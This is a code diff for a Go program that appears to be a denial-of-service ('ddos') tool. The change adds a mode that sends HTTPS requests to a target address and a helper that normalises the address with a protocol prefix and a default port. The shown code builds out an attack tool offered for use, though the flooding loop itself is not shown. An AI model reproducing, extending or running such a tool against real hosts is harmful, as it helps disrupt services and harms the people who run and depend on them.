@@ -6,8 +6,10 @@ import (
 	"github.com/Streamer272/ddos/options"
 	"io/ioutil"
 	"net"
+	"net/http"
 	"os"
 	"os/signal"
+	"regexp"
 	"strings"
 	"syscall"
 	"time"
@@ -19,6 +21,15 @@ const (
 )
 
 func ddos(opt options.Options) error {
+	if opt.ForceHttps {
+		_, err := http.Get(opt.Address)
+		if err != nil {
+			return err
+		}
+
+		return nil
+	}
+
 	conn, err := net.Dial("tcp", opt.Address)
 	if err != nil {
 		return err
@@ -41,6 +52,23 @@ func ddos(opt options.Options) error {
 	return nil
 }
 
+func fixAddress(opt options.Options, log logger.Logger) string {
+	protocolMatch, err := regexp.MatchString("https?://.*", opt.Address)
+	if err != nil {
+		log.Log("ERROR", fmt.Sprintf("Couldn't match regex, %v...", err), true)
+	}
+	if opt.ForceHttps && !protocolMatch && err == nil {
+		log.Log("WARN", fmt.Sprintf("%v does not have protocol, using https://", opt.Address), true)
+		opt.Address = "https://" + opt.Address
+	}
+	if !strings.Contains(opt.Address, ":") {
+		log.Log("WARN", fmt.Sprintf("%v does not contain port, using 80...", opt.Address), true)
+		opt.Address = opt.Address + ":80"
+	}
+
+	return opt.Address
+}
+
 func main() {
 	opt := options.Parse()
 	log := logger.NewLogger(opt)
@@ -55,10 +83,8 @@ func main() {
 		outputFileSplit := strings.Split(opt.OutputFile, ".")
 		log.Log("WARN", fmt.Sprintf("Recommended extension for output file is .log, has .%v...", outputFileSplit[len(outputFileSplit)-1]), true)
 	}
-	if !strings.Contains(opt.Address, ":") {
-		log.Log("WARN", fmt.Sprintf("%v does not contain port, using 80...", opt.Address), true)
-		opt.Address = opt.Address + ":80"
-	}
+
+	opt.Address = fixAddress(opt, log)
 
 	// errors
 	err := ddos(opt)
